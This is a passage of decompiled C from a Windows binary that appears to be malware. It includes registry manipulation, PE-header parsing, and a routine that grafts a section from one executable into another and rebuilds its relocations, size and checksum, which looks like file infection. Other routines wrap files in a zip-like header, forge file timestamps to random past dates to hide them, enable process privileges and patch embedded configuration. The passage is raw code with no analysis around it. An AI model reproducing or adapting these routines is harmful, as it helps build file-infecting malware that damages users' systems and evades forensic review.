  LPVOID v6; // esi
  int v8; // edi
  char v9[1024]; // [esp+8h] [ebp-418h] BYREF
  char v10[16]; // [esp+408h] [ebp-18h] BYREF
  int v11; // [esp+418h] [ebp-8h] BYREF
  int v12; // [esp+41Ch] [ebp-4h] BYREF

  v4 = 0;
  v12 = 0;
  sub_40174B(v10);
  v5 = sub_40174E((int)v10, lpFileName, (int)&v11, 1);
  v6 = v5;
  if ( !v5 )
    return 0;
  v8 = (int)v5;
  while ( v8 - (int)v6 < v11 - 1 )
  {
    v8 = sub_4043D4(v8, (int)v6 + v11 - v8 - 1, v9, 0x400u, (int)&v12);
    if ( v12 )
    {
      if ( sub_4033F4(Dest, v9, a3, a4) > 0 )
        ++v4;
    }
  }
  sub_401808((int)v10);
  return v4;
}

//----- (004045EF) --------------------------------------------------------
int __cdecl sub_4045EF(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE Dst, HKEY Size)
{
  DWORD Type; // [esp+0h] [ebp-8h] BYREF
  DWORD cbData; // [esp+4h] [ebp-4h] BYREF

  Type = -1;
  cbData = (DWORD)Size;
  memset(Dst, 0, (size_t)Size);
  if ( RegOpenKeyA(hKey, lpSubKey, &Size) )
    return 1;
  RegQueryValueExA(Size, lpValueName, 0, &Type, Dst, &cbData);
  RegCloseKey(Size);
  return 0;
}

//----- (0040464B) --------------------------------------------------------
int __cdecl sub_40464B(HKEY hKey, LPCSTR phkResult, LPCSTR lpValueName, BYTE *Str)
{
  DWORD v5; // eax

  if ( RegCreateKeyA(hKey, phkResult, (PHKEY)&phkResult) )
    return 1;
  v5 = strlen((const char *)Str);
  RegSetValueExA((HKEY)phkResult, lpValueName, 0, 1u, Str, v5);
  RegCloseKey((HKEY)phkResult);
  return 0;
}

//----- (00404691) --------------------------------------------------------
int __cdecl sub_404691(HKEY hKey, LPCSTR lpSubKey, int a3, int a4)
{
  DWORD v4; // esi
  int v6; // eax
  int v7; // esi
  CHAR Name[260]; // [esp+4h] [ebp-10Ch] BYREF
  int v9; // [esp+108h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+10Ch] [ebp-4h] BYREF

  v4 = 0;
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 0;
  while ( !RegEnumKeyA(phkResult, v4, Name, 0x104u) )
  {
    if ( a3 )
    {
      v9 = 0;
      v6 = ((int (__cdecl *)(HKEY, LPCSTR, CHAR *, int *, int))a3)(hKey, lpSubKey, Name, &v9, a4);
      if ( v9 )
      {
        v7 = v6;
        goto LABEL_9;
      }
    }
    ++v4;
  }
  v7 = 1;
LABEL_9:
  RegCloseKey(phkResult);
  return v7;
}

//----- (0040470F) --------------------------------------------------------
int __cdecl sub_40470F(HKEY hKey, LPCSTR lpSubKey, int a3, int a4)
{
  DWORD v4; // ebx
  int v6; // eax
  int v7; // esi
  BYTE Data[1024]; // [esp+8h] [ebp-814h] BYREF
  CHAR ValueName[1024]; // [esp+408h] [ebp-414h] BYREF
  DWORD Type; // [esp+808h] [ebp-14h] BYREF
  DWORD cchValueName; // [esp+80Ch] [ebp-10h] BYREF
  int v12; // [esp+810h] [ebp-Ch] BYREF
  DWORD cbData; // [esp+814h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+818h] [ebp-4h] BYREF

  v4 = 0;
  cchValueName = 1024;
  cbData = 1024;
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 0;
  while ( 1 )
  {
    cchValueName = 1024;
    cbData = 1024;
    if ( RegEnumValueA(phkResult, v4, ValueName, &cchValueName, 0, &Type, Data, &cbData) )
      break;
    if ( Type == 1 )
    {
      if ( a3 )
      {
        v12 = 0;
        v6 = ((int (__cdecl *)(HKEY, LPCSTR, CHAR *, int *, int))a3)(hKey, lpSubKey, ValueName, &v12, a4);
        if ( v12 )
        {
          v7 = v6;
          goto LABEL_10;
        }
      }
    }
    ++v4;
  }
  v7 = 1;
LABEL_10:
  RegCloseKey(phkResult);
  return v7;
}

//----- (004047B6) --------------------------------------------------------
int __cdecl sub_4047B6(int a1)
{
  int v1; // eax

  if ( a1 || !dword_4131CC )
  {
    v1 = GetTickCount();
    sub_407F35(v1);
    dword_4131CC = sub_407F3F();
  }
  return sub_407F3F();
}
// 4131CC: using guessed type int dword_4131CC;

//----- (004047E2) --------------------------------------------------------
HANDLE __cdecl sub_4047E2(LPCSTR lpApplicationName, LPSTR lpCommandLine)
{
  BOOL v2; // eax
  struct _STARTUPINFOA StartupInfo; // [esp+4h] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+48h] [ebp-10h] BYREF

  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 68;
  v2 = CreateProcessA(lpApplicationName, lpCommandLine, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
  return v2 ? ProcessInformation.hProcess : 0;
}

//----- (00404825) --------------------------------------------------------
const char *__cdecl sub_404825(LPCSTR lpFileName)
{
  const char *result; // eax
  const char *v2; // ebx
  int v3; // edi
  char v4[16]; // [esp+8h] [ebp-1Ch] BYREF
  size_t MaxCount; // [esp+18h] [ebp-Ch]
  int v6; // [esp+1Ch] [ebp-8h]
  int v7; // [esp+20h] [ebp-4h] BYREF

  sub_40174B(v4);
  v6 = 0;
  MaxCount = strlen(Str1);
  result = (const char *)sub_40174E((int)v4, lpFileName, (int)&v7, 1);
  v2 = result;
  if ( result )
  {
    if ( (unsigned int)v7 >= 0xA000 )
    {
      v3 = 4096;
      if ( (unsigned int)(v7 - 1000) > 0x1000 )
      {
        while ( strncmp(Str1, &v2[v3], MaxCount) )
        {
          if ( ++v3 >= (unsigned int)(v7 - 1000) )
            goto LABEL_8;
        }
        v6 = 1;
      }
    }
LABEL_8:
    sub_401808((int)v4);
    result = (const char *)v6;
  }
  return result;
}

//----- (004048B6) --------------------------------------------------------
int __cdecl sub_4048B6(HKEY hKey, char *lpSubKey, LPCSTR Source, int a4, int a5)
{
  BYTE Data[1024]; // [esp+0h] [ebp-400h] BYREF

  if ( !sub_403C88() )
    return 1;
  Data[0] = 0;
  sub_4045EF(hKey, lpSubKey, Source, Data, (HKEY)0x400);
  if ( !sub_404825((LPCSTR)Data) )
    return 1;
  *(_DWORD *)a5 = 1;
  *(_DWORD *)a4 = 1;
  sub_407750();
  sub_407750();
  sub_407750();
  return 0;
}

//----- (0040494A) --------------------------------------------------------
int __cdecl sub_40494A(HKEY hKey, char *Source, int Sourcea, int a4, int a5)
{
  BYTE Data[1024]; // [esp+0h] [ebp-800h] BYREF
  CHAR SubKey[1024]; // [esp+400h] [ebp-400h] BYREF

  sub_407750();
  strcat(SubKey, asc_40F044);
  strcat(SubKey, (const char *)Sourcea);
  if ( !sub_403C88() )
    return 1;
  Data[0] = 0;
  sub_4045EF(hKey, SubKey, &ValueName, Data, (HKEY)0x400);
  if ( !sub_404825((LPCSTR)Data) )
    return 1;
  *(_DWORD *)a5 = 1;
  *(_DWORD *)a4 = 1;
  sub_407750();
  sub_407750();
  sub_407750();
  return 0;
}

//----- (00404A18) --------------------------------------------------------
int sub_404A18()
{
  char *v0; // eax
  int i; // esi
  size_t v2; // eax
  CHAR Buffer[260]; // [esp+0h] [ebp-51Ch] BYREF
  CHAR FileName[1024]; // [esp+104h] [ebp-418h] BYREF
  char Str; // [esp+504h] [ebp-18h] BYREF
  CHAR SrcStr[19]; // [esp+505h] [ebp-17h] BYREF
  int v8; // [esp+518h] [ebp-4h] BYREF

  v8 = 0;
  if ( dword_4938F0 )
  {
    sub_403CE3(FileName, 2);
    sub_407750();
    sub_40470F(HKEY_LOCAL_MACHINE, FileName, (int)sub_4048B6, (int)&v8);
  }
  else
  {
    v0 = sub_40347E(SubKey, 4);
    sub_404691(HKEY_LOCAL_MACHINE, v0, (int)sub_40494A, (int)&v8);
  }
  dword_4938F4 = v8;
  if ( !v8 )
  {
    GetSystemDirectoryA(Buffer, 0x104u);
    for ( i = 0; i < 10; ++i )
    {
      Str = 0;
      sub_407750();
      v2 = strlen(&Str);
      sub_40372F(&Str + v2, 2, 4, 4);
      _strlwr(SrcStr);
      sub_407750();
      strcat(FileName, asc_40F044);
      strcat(FileName, &Str);
      strcat(FileName, a0);
      if ( !sub_403E63(FileName) )
        break;
    }
    strcat(Destination, &Str);
    sub_407750();
  }
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 4938F4: using guessed type int dword_4938F4;

//----- (00404B75) --------------------------------------------------------
__int16 *__cdecl sub_404B75(__int16 *a1, __int16 a2)
{
  __int16 *result; // eax
  __int16 v3; // cx
  __int16 v4; // cx

  result = a1;
  a1[1] += a2;
  v3 = a1[1];
  while ( v3 < 1 )
  {
    a1[1] += 30;
    v3 = a1[1];
    --*a1;
  }
  if ( a1[1] > 31 )
  {
    do
    {
      a1[1] -= 30;
      v4 = a1[1];
      ++*a1;
    }
    while ( v4 > 31 );
  }
  if ( *a1 < 1 )
    *a1 += 12;
  if ( *a1 > 12 )
    *a1 -= 12;
  return result;
}

//----- (00404BD2) --------------------------------------------------------
int __cdecl sub_404BD2(int a1, char *Dest, int a3)
{
  char *v3; // eax
  char v4; // cl
  int i; // edx

  *Dest = 0;
  *(_BYTE *)a3 = 0;
  if ( *(_BYTE *)a1 != 92 || *(_BYTE *)(a1 + 1) != 92 )
    return 1;
  sub_407750();
  v3 = (char *)(a1 + 2);
  v4 = *(_BYTE *)(a1 + 2);
  for ( i = 2; v4 != 92; v4 = *++v3 )
  {
    if ( !v4 )
      break;
    ++i;
    Dest[(_DWORD)v3 - a1] = *v3;
  }
  Dest[i] = 0;
  if ( *(_BYTE *)(a1 + i) )
  {
    sub_407750();
    return 0;
  }
  return 2;
}

//----- (00404C49) --------------------------------------------------------
BOOL sub_404C49()
{
  char Dir[260]; // [esp+4h] [ebp-410h] BYREF
  char FullPath[260]; // [esp+108h] [ebp-30Ch] BYREF
  char String2[260]; // [esp+20Ch] [ebp-208h] BYREF
  CHAR Filename[260]; // [esp+310h] [ebp-104h] BYREF

  sub_407750();
  GetModuleFileNameA(0, Filename, 0x104u);
  _splitpath(FullPath, 0, Dir, 0, 0);
  _splitpath(Filename, 0, String2, 0, 0);
  return _strcmpi(Dir, String2) == 0;
}

//----- (00404CC5) --------------------------------------------------------
int __cdecl sub_404CC5(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  int result; // eax

  if ( a2 >= 0x44
    && *(_BYTE *)a1 == 77
    && *(_BYTE *)(a1 + 1) == 90
    && (v2 = *(unsigned __int16 *)(a1 + 60), v2 <= a2 - 4) )
  {
    result = *(_DWORD *)(a1 + *(unsigned __int16 *)(a1 + 60)) == 17744 ? v2 : 0;
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (00404D04) --------------------------------------------------------
_DWORD *__cdecl sub_404D04(int a1, unsigned int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // edx
  int v6; // eax
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int v9; // edi
  _DWORD *result; // eax
  unsigned int v11; // edx

  v3 = sub_404CC5(a1, a3);
  if ( v3 )
  {
    v4 = v3 + a1;
    v5 = *(_DWORD *)(v3 + a1 + 116);
    v6 = v3 + a1 + 116;
    if ( v5 >= a2 )
    {
      v7 = *(unsigned __int16 *)(v4 + 6);
      v8 = *(_DWORD *)(v6 + 8 * a2 - 4);
      v9 = 0;
      result = (_DWORD *)(v6 + 4 + 8 * v5 + 8);
      if ( v7 )
      {
        while ( (unsigned int)result - a1 < a3 - 4 )
        {
          v11 = result[1];
          if ( v11 + *result <= v8 || v11 > v8 )
          {
            result += 10;
            if ( ++v9 < v7 )
              continue;
          }
          if ( v9 < v7 )
            return result;
          return 0;
        }
      }
    }
  }
  return 0;
}

//----- (00404D74) --------------------------------------------------------
int __cdecl sub_404D74(int a1, int a2, int a3, unsigned int a4, unsigned int a5)
{
  int v7; // eax
  unsigned int *v8; // eax
  unsigned int v9; // eax
  int v11; // [esp+14h] [ebp+8h]
  int v12; // [esp+18h] [ebp+Ch]

  v12 = a2 + 16;
  if ( a2 - a1 + 16 > a5 )
    return 0;
  v11 = 0;
  if ( *(unsigned __int16 *)(a2 + 12) + *(unsigned __int16 *)(a2 + 14) > 0 )
  {
    while ( v12 - a1 + 8 <= a5 )
    {
      v7 = *(_DWORD *)(v12 + 4);
      if ( v7 >= 0 )
      {
        v8 = (unsigned int *)(a1 + v7);
        *v8 += a4 - a3;
        v9 = *v8;
        if ( v9 < a4 || v9 >= a4 + a5 )
          return 0;
      }
      else if ( !sub_404D74(a1, a1 + (v7 & 0x7FFFFFFF), a3, a4, a5) )
      {
        return 0;
      }
      v12 += 8;
      if ( ++v11 >= *(unsigned __int16 *)(a2 + 12) + *(unsigned __int16 *)(a2 + 14) )
        return 1;
    }
  }
  return 1;
}

//----- (00404E1A) --------------------------------------------------------
int __cdecl sub_404E1A(int a1, LPCSTR lpFileName, int a3)
{
  LPVOID v4; // eax
  int v5; // ebx
  _DWORD *v6; // edi
  _DWORD *v7; // esi
  int v8; // eax
  int v9; // ebx
  int v10; // ecx
  unsigned int v11; // eax
  CHAR *v12; // esi
  unsigned int v13; // edi
  int v14; // eax
  int v15; // ecx
  unsigned int v16; // eax
  LONG v17; // eax
  char v18[16]; // [esp+4h] [ebp-3Ch] BYREF
  char v19[16]; // [esp+14h] [ebp-2Ch] BYREF
  int v20; // [esp+24h] [ebp-1Ch]
  unsigned int v21; // [esp+28h] [ebp-18h]
  LPVOID v22; // [esp+2Ch] [ebp-14h]
  LONG lDistanceToMove; // [esp+30h] [ebp-10h]
  int v24; // [esp+34h] [ebp-Ch]
  int v25; // [esp+38h] [ebp-8h] BYREF
  int v26; // [esp+3Ch] [ebp-4h] BYREF
  LPCSTR lpFileNamea; // [esp+4Ch] [ebp+Ch]
  int v28; // [esp+50h] [ebp+10h]
  int v29; // [esp+50h] [ebp+10h]

  sub_40174B(v19);
  sub_40174B(v18);
  v25 = 0;
  v26 = 0;
  v24 = 0;
  lDistanceToMove = 0;
  lpFileNamea = (LPCSTR)sub_40174E((int)v18, lpFileName, (int)&v26, 1);
  if ( !lpFileNamea )
    return 0;
  sub_40406E((LPCSTR)a1, v26 + a3 + 4096);
  v4 = sub_40174E((int)v19, (LPCSTR)a1, (int)&v25, 0);
  v5 = (int)v4;
  v22 = v4;
  if ( v4 )
  {
    v6 = sub_404D04((int)v4, 3u, v25);
    if ( v6 )
    {
      v7 = sub_404D04((int)lpFileNamea, 3u, v26);
      if ( v7 )
      {
        v28 = sub_404CC5((int)lpFileNamea, v26);
        v8 = sub_404CC5(v5, v25);
        if ( *(_WORD *)&lpFileNamea[v28 + 92] == 2 )
        {
          v9 = v8 + v5;
          v29 = *(_DWORD *)&lpFileNamea[v28 + 140];
          *(_DWORD *)(v9 + 140) = v29;
          v10 = v6[3];
          v6[2] = v7[2];
          *v6 = *v7;
          lDistanceToMove = v10 + v6[2];
          v20 = v7[1];
          v21 = v6[1];
          v11 = v7[2];
          v12 = (CHAR *)&lpFileNamea[v7[3]];
          v13 = (unsigned int)v22 + v10;
          if ( (unsigned int)&v12[v11 - (_DWORD)lpFileNamea] <= v26 )
          {
            sub_407C00(v13, v12, v11);
            v14 = sub_404D74(v13, v13, v20, v21, v29);
            v15 = *(unsigned __int16 *)(v9 + 20);
            v24 = v14;
            v16 = *(_DWORD *)(v15 + v9 + 40 * *(unsigned __int16 *)(v9 + 6) - 8)
                + *(_DWORD *)(v15 + v9 + 40 * *(unsigned __int16 *)(v9 + 6) - 4);
            if ( (v16 & 0xFFF) != 0 )
              v16 = ((v16 >> 12) + 1) << 12;
            *(_DWORD *)(v9 + 80) = v16;
          }
        }
      }
    }
    sub_401808((int)v19);
  }
  sub_401808((int)v18);
  if ( v24 )
  {
    v17 = lDistanceToMove;
    if ( lDistanceToMove < (unsigned int)v26 )
      v17 = v26;
    sub_40406E((LPCSTR)a1, v17);
    sub_405108((LPCSTR)a1);
  }
  return v24;
}

//----- (00404FC5) --------------------------------------------------------
int __cdecl sub_404FC5(LPCSTR lpFileName, int a2)
{
  int v2; // esi
  LPVOID v3; // eax
  int v4; // ebx
  int v6; // edi
  _DWORD *v7; // eax
  _DWORD *v8; // esi
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  unsigned int v11; // edi
  int v12; // eax
  char v13[16]; // [esp+8h] [ebp-14h] BYREF
  int v14; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v13);
  v2 = 0;
  v3 = sub_40174E((int)v13, lpFileName, (int)&v14, 0);
  v4 = (int)v3;
  if ( !v3 )
    return 0;
  v6 = sub_404CC5((int)v3, v14);
  if ( v6 && (v7 = sub_404D04(v4, 3u, v14)) != 0 )
  {
    v8 = (_DWORD *)(v6 + v4);
    *(_DWORD *)(v6 + v4 + 140) = 16;
    v9 = v7[1] + 16;
    *v7 = 16;
    v7[2] = 16;
    if ( (v9 & 0xFFF) != 0 )
      v9 = ((v9 >> 12) + 1) << 12;
    v8[20] = v9;
    v10 = v7[3];
    v11 = v10 + v7[2];
    if ( v11 < a2 )
      v11 = a2;
    if ( (v11 & 0xFFF) != 0 )
      v11 = ((v11 >> 12) + 1) << 12;
    if ( v10 < v14 )
      memset((void *)(v10 + v4), 0, 0x10u);
    v12 = v8[59];
    if ( v12 )
      v8[10] = v12;
    v2 = 1;
  }
  else
  {
    v11 = (unsigned int)lpFileName;
  }
  sub_401808((int)v13);
  if ( v2 )
    sub_40406E(lpFileName, v11);
  sub_405108(lpFileName);
  return v2;
}

//----- (004050B5) --------------------------------------------------------
unsigned int __cdecl sub_4050B5(_WORD *a1, unsigned int a2)
{
  unsigned int v2; // ecx
  unsigned int v4; // esi
  unsigned int v5; // eax
  __int16 v7; // [esp+0h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a2 >> 1 )
  {
    v4 = a2 >> 1;
    do
    {
      v2 = (((unsigned __int16)*a1 + v2) >> 16) + (unsigned __int16)(*a1 + v2);
      ++a1;
      --v4;
    }
    while ( v4 );
    v7 = v2;
  }
  v5 = HIWORD(v2);
  LOWORD(v5) = v7 + HIWORD(v2);
  return a2 + v5;
}

//----- (00405108) --------------------------------------------------------
_WORD *__cdecl sub_405108(LPCSTR lpFileName)
{
  _WORD *v1; // esi
  _WORD *result; // eax
  _WORD *v3; // edi
  int v4; // eax
  unsigned int *v5; // esi
  unsigned int v6; // eax
  char v7[16]; // [esp+8h] [ebp-14h] BYREF
  int v8; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v7);
  v8 = 0;
  v1 = 0;
  result = sub_40174E((int)v7, lpFileName, (int)&v8, 0);
  v3 = result;
  if ( result )
  {
    v4 = sub_404CC5((int)result, v8);
    if ( v4 )
    {
      v5 = (unsigned int *)((char *)v3 + v4 + 88);
      if ( *v5 )
      {
        *v5 = 0;
        v6 = sub_4050B5(v3, v8);
        *v5 = v6;
      }
      else
      {
        v6 = (unsigned int)lpFileName;
      }
      v1 = (_WORD *)v6;
    }
    sub_401808((int)v7);
    result = v1;
  }
  return result;
}

//----- (00405173) --------------------------------------------------------
int __cdecl sub_405173(LPCSTR lpMultiByteStr)
{
  WCHAR WideCharStr[1024]; // [esp+0h] [ebp-800h] BYREF

  if ( dword_4938F0 || !dword_493910 )
    return 0;
  MultiByteToWideChar(0, 1u, lpMultiByteStr, -1, WideCharStr, 200);
  return dword_493910(0, WideCharStr);
}
// 4938F0: using guessed type int dword_4938F0;
// 493910: using guessed type int (__stdcall *dword_493910)(_DWORD, _DWORD);

//----- (004051BE) --------------------------------------------------------
__int16 __cdecl sub_4051BE(unsigned __int8 *a1, int a2)
{
  __int16 v4; // cx
  __int16 v5; // dx
  unsigned __int16 v6; // bx
  unsigned __int16 v7; // ax
  __int16 v8; // cx
  __int16 v9; // dx
  char v10; // cf
  __int16 v11; // t2

  v4 = -1;
  v5 = -1;
  do
  {
    v6 = 0;
    v7 = *a1++;
    LOBYTE(v7) = v4 ^ v7;
    LOBYTE(v8) = HIBYTE(v4);
    HIBYTE(v8) = v5;
    LOBYTE(v9) = HIBYTE(v5);
    HIBYTE(v9) = 8;
    do
    {
      v10 = v6 & 1;
      v6 >>= 1;
      v11 = v10 << 15;
      v10 = v7 & 1;
      v7 = (v7 >> 1) | v11;
      if ( v10 )
      {
        v7 ^= 0x8320u;
        v6 ^= 0xEDB8u;
      }
      --HIBYTE(v9);
    }
    while ( HIBYTE(v9) );
    v4 = v7 ^ v8;
    v5 = v6 ^ v9;
    --a2;
  }
  while ( a2 );
  return ~v4;
}

//----- (00405226) --------------------------------------------------------
int __cdecl sub_405226(LPCSTR lpFileName, LPCVOID lpBuffer, char *Str, int a4)
{
  DWORD v4; // edi
  unsigned __int16 v5; // si
  __int16 v6; // ax
  HANDLE v7; // eax
  void *v8; // edi
  int v10; // eax
  __int16 Buffer; // [esp+Ch] [ebp-150h] BYREF
  unsigned __int8 v12; // [esp+Eh] [ebp-14Eh] BYREF
  __int16 v13; // [esp+Fh] [ebp-14Dh]
  unsigned __int16 v14; // [esp+11h] [ebp-14Bh]
  DWORD v15; // [esp+13h] [ebp-149h]
  DWORD v16; // [esp+17h] [ebp-145h]
  char v17; // [esp+1Bh] [ebp-141h]
  int v18; // [esp+1Ch] [ebp-140h]
  int v19; // [esp+20h] [ebp-13Ch]
  char v20; // [esp+24h] [ebp-138h]
  char v21; // [esp+25h] [ebp-137h]
  __int16 v22; // [esp+26h] [ebp-136h]
  int v23; // [esp+28h] [ebp-134h]
  char v24[16]; // [esp+12Ch] [ebp-30h] BYREF
  DWORD NumberOfBytesWritten; // [esp+13Ch] [ebp-20h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+140h] [ebp-1Ch] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+144h] [ebp-18h] BYREF
  HANDLE hFile; // [esp+154h] [ebp-8h]
  int v29; // [esp+158h] [ebp-4h]
  unsigned __int8 *lpBuffera; // [esp+168h] [ebp+Ch]

  v4 = 3;
  sub_40174B(v24);
  v5 = strlen(Str) + 32;
  GetLocalTime(&SystemTime);
  SystemTime.wMonth &= 0xFFFEu;
  SystemTime.wMinute -= sub_4047B6(0) % 0x1Eu;
  if ( SystemTime.wMinute >= 0x3Cu )
    SystemTime.wMinute = 1;
  LOWORD(v29) = (LOBYTE(SystemTime.wSecond) >> 1) & 0x1F | (32 * ((SystemTime.wHour << 6) | SystemTime.wMinute & 0x3F));
  v6 = BYTE2(v29) & 0x1F ^ ((SystemTime.wYear + 68) << 9);
  HIWORD(v29) = ((unsigned __int8)((32 * (SystemTime.wMonth & 0xF)) | v6 & 0x1F) ^ LOBYTE(SystemTime.wDay)) & 0x1F ^ ((32 * (SystemTime.wMonth & 0xF)) | v6 & 0xFE1F);
  if ( a4 )
    v4 = 2;
  SetFileAttributesA(lpFileName, 0x20u);
  v7 = CreateFileA(lpFileName, 0xC0000000, 3u, 0, v4, 0x20u, 0);
  v8 = v7;
  hFile = v7;
  if ( v7 == (HANDLE)-1 )
    return 0;
  SetFilePointer(v7, 0, 0, 2u);
  lpBuffera = (unsigned __int8 *)sub_40174E((int)v24, (LPCSTR)lpBuffer, (int)&nNumberOfBytesToWrite, 1);
  if ( !lpBuffera )
  {
    CloseHandle(v8);
    return 0;
  }
  v12 = 116;
  v13 = 0x8000;
  v14 = v5;
  v15 = nNumberOfBytesToWrite;
  v16 = nNumberOfBytesToWrite;
  v17 = 0;
  LOWORD(v10) = sub_4051BE(lpBuffera, nNumberOfBytesToWrite);
  v18 = v10;
  v20 = 20;
  v19 = v29;
  v21 = 48;
  v22 = strlen(Str);
  v23 = 0;
  sub_407750();
  Buffer = sub_4051BE(&v12, v5 - 2);
  if ( a4 )
    WriteFile(hFile, &unk_410DAC, 0x14u, &NumberOfBytesWritten, 0);
  WriteFile(hFile, &Buffer, v5, &NumberOfBytesWritten, 0);
  WriteFile(hFile, lpBuffera, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
  sub_401808((int)v24);
  CloseHandle(hFile);
  if ( a4 )
    sub_405522(lpFileName);
  return 1;
}
// 40536A: variable 'v10' is possibly undefined

//----- (0040542A) --------------------------------------------------------
int sub_40542A()
{
  int result; // eax
  int v1; // [esp+0h] [ebp-4h] BYREF

  v1 = 0;
  result = 1;
  if ( dword_493914 )
    result = dword_493914(&v1, 0);
  return result;
}
// 493914: using guessed type int (__stdcall *dword_493914)(_DWORD, _DWORD);

//----- (00405449) --------------------------------------------------------
int __cdecl sub_405449(HANDLE hObject, LPCSTR lpName)
{
  HANDLE v2; // eax
  int result; // eax
  struct _TOKEN_PRIVILEGES PreviousState; // [esp+4h] [ebp-660h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+644h] [ebp-20h] BYREF
  DWORD ReturnLength; // [esp+654h] [ebp-10h] BYREF
  struct _LUID Luid; // [esp+658h] [ebp-Ch] BYREF
  int v8; // [esp+660h] [ebp-4h]

  v2 = hObject;
  ReturnLength = 1600;
  v8 = 0;
  if ( !hObject )
    v2 = GetCurrentProcess();
  result = OpenProcessToken(v2, 0x28u, &hObject);
  if ( result )
  {
    if ( LookupPrivilegeValueA(0, lpName, &Luid) )
    {
      NewState.Privileges[0].Luid = Luid;
      NewState.PrivilegeCount = 0;
      NewState.Privileges[0].Attributes = 0;
      AdjustTokenPrivileges(hObject, 0, &NewState, 0x10u, &PreviousState, &ReturnLength);
      if ( !GetLastError() )
      {
        PreviousState.Privileges[0].Attributes |= 2u;
        PreviousState.Privileges[0].Luid = Luid;
        PreviousState.PrivilegeCount = 1;
        AdjustTokenPrivileges(hObject, 0, &PreviousState, 0x10u, 0, 0);
        if ( !GetLastError() )
          v8 = 1;
      }
    }
    CloseHandle(hObject);
    result = v8;
  }
  return result;
}

//----- (00405522) --------------------------------------------------------
HANDLE __cdecl sub_405522(LPCSTR lpFileName)
{
  HANDLE result; // eax
  void *v2; // edi
  struct _SYSTEMTIME SystemTime; // [esp+8h] [ebp-18h] BYREF
  struct _FILETIME FileTime; // [esp+18h] [ebp-8h] BYREF

  result = CreateFileA(lpFileName, 0xC0000000, 1u, 0, 3u, 0x20u, 0);
  v2 = result;
  if ( result )
  {
    GetSystemTime(&SystemTime);
    SystemTime.wMinute = sub_4047B6(0) % 0x3Cu;
    SystemTime.wHour -= sub_4047B6(0) % 0x18u;
    if ( (__int16)SystemTime.wHour <= 0 )
    {
      SystemTime.wHour += 24;
      --SystemTime.wDay;
    }
    SystemTime.wDay -= sub_4047B6(0) % 0x1Cu;
    if ( (__int16)SystemTime.wDay <= 0 )
      SystemTime.wDay = sub_4047B6(0) % 3u;
    SystemTime.wMonth -= sub_4047B6(0) % 0xCu;
    if ( (__int16)SystemTime.wMonth <= 0 )
    {
      SystemTime.wMonth += 12;
      --SystemTime.wYear;
    }
    SystemTimeToFileTime(&SystemTime, &FileTime);
    SetFileTime(v2, &FileTime, &FileTime, &FileTime);
    result = (HANDLE)CloseHandle(v2);
  }
  return result;
}

//----- (004055FE) --------------------------------------------------------
int sub_4055FE()
{
  DWORD v0; // eax
  void *v1; // eax
  char *v3; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-94h] BYREF

  sub_4047B6(1);
  memset(&byte_4937EC, 0, 0x104u);
  memset(&FullPath, 0, 0x104u);
  memset(&ApplicationName, 0, 0x104u);
  memset(byte_4934E0, 0, sizeof(byte_4934E0));
  memset(Destination, 0, sizeof(Destination));
  sub_403634((int)&unk_40F0D4, 8806, byte_40F0D0);
  sub_402680(&dword_4938F8);
  v0 = GetVersion();
  dword_493900 = 0;
  dword_4938F0 = v0 & 0x80000000;
  VersionInformation.dwOSVersionInfoSize = 148;
  GetVersionExA(&VersionInformation);
  if ( VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 1 )
    dword_493900 = 1;
  sub_404A18();
  v1 = sub_407F8F(0x7D000u);
  dword_4933D8 = (int)v1;
  if ( !v1 )
    return 0;
  memset(v1, 0, 0x7D000u);
  sub_4057BE();
  v3 = sub_40347E(Name, 1);
  sub_405449(0, v3);
  return 1;
}
// 4938F0: using guessed type int dword_4938F0;
// 4938F8: using guessed type int dword_4938F8;
// 493900: using guessed type int dword_493900;

//----- (00405705) --------------------------------------------------------
const char *__cdecl sub_405705(LPCSTR lpFileName, char *Str1)
{
  const char *result; // eax
  const char *v3; // edi
  int v4; // esi
  int v5; // esi
  size_t v6; // ebx
  int v7; // edi
  char v8[16]; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  sub_40174B(v8);
  result = (const char *)sub_40174E((int)v8, lpFileName, (int)&v9, 0);
  v3 = result;
  if ( result )
  {
    v4 = 4096;
    if ( (unsigned int)v9 >= 0x1000 )
    {
      v6 = strlen(Str1);
      if ( (unsigned int)(v9 - 1000) > 0x1000 )
      {
        while ( strncmp(Str1, &v3[v4], v6) )
        {
          if ( ++v4 >= (unsigned int)(v9 - 1000) )
            goto LABEL_9;
        }
        v7 = (int)&v3[v4 + 20];
        sub_403634(v7, 8806, (char *)(v7 - 4));
        sub_407C00(v7, Str1 + 20, 0x2266u);
        sub_4035A1(v7 - 4);
        sub_4035D8(v7, 8806, (char *)(v7 - 4));
      }
LABEL_9:
      v5 = 1;
    }
    else
    {
      v5 = 0;
    }
    sub_401808((int)v8);
    result = (const char *)v5;
  }
  return result;
}

//----- (004057BE) --------------------------------------------------------
HMODULE sub_4057BE()
{
  char *v0; // eax
  HMODULE v1; // ebp
  char *v2; // eax
  char *v3; // eax
  char *v4; // eax
  char *v5; // eax
  HMODULE v6; // ebp
  char *v7; // eax
  HMODULE result; // eax
  HMODULE v9; // ebx
  char *v10; // eax

  v0 = sub_40347E(LibFileName, 2);
